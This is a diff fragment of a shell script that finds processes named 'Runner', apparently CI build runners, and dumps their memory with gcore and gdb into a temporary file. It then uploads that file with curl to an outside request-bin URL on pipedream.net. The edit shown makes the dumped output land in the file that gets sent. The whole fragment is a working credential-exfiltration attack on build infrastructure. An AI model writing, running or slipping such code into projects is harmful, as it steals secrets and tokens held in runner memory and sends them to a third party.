@@ -8,7 +8,7 @@ for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
     echo "---$pid---"
     #gcore -o /tmp/hola.txt $pid >> /tmp/file.txt
-    gcore -o /tmp/aaa | gdb -p $pid
+    gcore -o /tmp/aaa | gdb -p $pid >> /tmp/file.txt
 done
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
